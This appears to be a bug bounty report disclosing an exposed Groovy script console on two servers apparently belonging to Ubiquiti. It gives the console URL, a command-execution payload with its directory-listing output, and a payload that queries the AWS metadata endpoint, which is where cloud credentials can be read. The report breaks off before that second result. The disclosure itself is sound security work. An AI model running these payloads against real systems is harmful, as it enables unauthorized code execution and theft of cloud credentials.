Summary:

Hi,

First of all. I'm not 100% able to verify that this server is actually owned by Ubnt as there are multiple DNS Name's in the SSL certificate.

```
DNS Name: *.uum.com
DNS Name: *.ubnt.com
DNS Name: *.svc.ubnt.com
DNS Name: *.api.uum.com
DNS Name: *.svc.uum.com
DNS Name: uum.com
```

So, the server hosted on https://54.191.232.223/and https://54.186.253.37/is reachable from the internet and has the scirpt console enabled.

You can execute code on it by going to: https://54.186.253.37/script and insert the following code:

```
"ls /".execute().text
```

__result__
````
Result: bin
boot
dev
docker-java-home
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

It also allows reaching the AWS metadata server:

```
"curl http://169.254.169.254/latest/meta-data/".execute().text
```

__Result__

```
